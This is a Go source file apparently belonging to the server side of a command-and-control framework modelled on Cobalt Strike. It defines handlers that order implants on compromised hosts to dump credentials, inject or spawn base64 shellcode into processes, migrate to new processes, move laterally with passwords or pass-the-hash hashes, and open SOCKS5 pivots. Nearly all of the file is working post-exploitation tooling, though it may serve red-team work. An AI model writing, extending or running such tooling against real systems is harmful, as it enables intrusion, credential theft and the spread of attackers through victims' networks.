package server

import (
	"encoding/base64"
	"fmt"
	"log/slog"
	"net/http"
	"strconv"

	"github.com/gin-gonic/gin"
)

// ── Injection / spawn / migrate / lateral / socks ─────────────────────────
// === High value CS parity: 1(SOCKS),3(creds),4(inject),6(lateral) ===

func (s *Server) handleCredsDump(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"creds", "creds_dump", ""})
}

func (s *Server) handleInject(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	pidStr := c.PostForm("pid")
	pid, err := strconv.Atoi(pidStr)
	if err != nil || pid <= 0 {
		respondError(c, http.StatusBadRequest, "invalid pid: must be a positive integer")
		return
	}
	tech := c.PostForm("tech")
	if tech == "" {
		tech = "createremotethread"
	}
	if err := validateCommandArg(tech, MaxTechniqueLength, "technique"); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	scB64 := c.PostForm("shellcode") // base64 shellcode
	scBytes, err := base64.StdEncoding.DecodeString(scB64)
	if err != nil {
		respondError(c, http.StatusBadRequest, "shellcode is not valid base64")
		return
	}
	if len(scBytes) == 0 {
		respondError(c, http.StatusBadRequest, "shellcode is empty")
		return
	}
	if len(scBytes) > MaxShellcodeSize {
		respondError(c, http.StatusBadRequest, fmt.Sprintf("shellcode too large: %d bytes (max %d)", len(scBytes), MaxShellcodeSize))
		return
	}
	cmd := pidStr + "|" + tech
	task := s.issueAgentTask(c, id, TaskSpec{Type: "inject", Command: cmd, Data: scB64})
	if task == nil {
		return
	}
	slog.Info("Inject requested", "agent_id", id, "pid", pidStr, "tech", tech)
	s.dispatchTask(c, task, "inject", cmd)
}

func (s *Server) handleSpawn(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = "rundll32.exe"
	}
	if err := validateCommandArg(target, MaxTargetLength, "target"); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	technique := c.PostForm("technique")
	if technique == "" {
		technique = "CreateRemoteThread"
	}
	if err := validateCommandArg(technique, MaxTechniqueLength, "technique"); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	_, b64Data, size, ok := s.handleFileUpload(c, "shellcode")
	if !ok {
		return
	}

	cmd := target + "|" + technique + "|" + b64Data
	task := s.issueAgentTask(c, id, TaskSpec{Type: "spawn", Command: cmd})
	if task == nil {
		return
	}
	slog.Info("Spawn requested", "agent_id", id, "target", target, "tech", technique, "size", size)
	s.LogAuditRecord(c, "spawn", "agent", id, fmt.Sprintf("Spawn: %s|%s (%d bytes shellcode)", target, technique, size), true, nil)
	s.dispatchTask(c, task, "spawn", fmt.Sprintf("%s|%s", target, technique))
}

// handleMigrate relocates the implant into a fresh process context: a copy of
// the agent is spawned detached at an optional operator-supplied path (default:
// platform-appropriate temp location) and the current instance exits.
func (s *Server) handleMigrate(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	path := c.PostForm("path")
	if err := validateCommandArg(path, MaxTargetLength, "path"); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "migrate", Command: path})
	if task == nil {
		return
	}
	slog.Info("Migrate requested", "agent_id", id, "path", path)
	s.LogAuditRecord(c, "migrate", "agent", id, fmt.Sprintf("Process migration requested (path=%q)", path), true, nil)
	s.dispatchTask(c, task, "migrate", path)
}

func (s *Server) handleLateral(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	spec := c.PostForm("spec")
	if spec == "" {
		spec = c.PostForm("command")
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "lateral", Command: spec})
	if task == nil {
		return
	}
	// Never log/audit the raw spec: it can embed domain passwords, PTH
	// hashes and pivots. Only a redacted summary may reach either sink.
	slog.Info("Lateral movement requested", "agent_id", id, "summary", lateralAuditSummary(spec))
	s.dispatchTask(c, task, "lateral", lateralAuditSummary(spec))
}

func (s *Server) handleSocks(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	port := c.PostForm("port")
	if port == "" {
		port = c.PostForm("command")
	}
	if port == "" {
		port = "1080"
	}
	if n, err := strconv.Atoi(port); err != nil || n < 1 || n > 65535 {
		respondError(c, http.StatusBadRequest, "invalid port (1-65535)")
		return
	}
	// Command carries the listen port on the *agent*
	task := s.issueAgentTask(c, id, TaskSpec{Type: "socks", Command: port})
	if task == nil {
		return
	}
	slog.Info("SOCKS5 requested on agent", "agent_id", id, "port", port)
	s.dispatchTask(c, task, "socks", port)
}
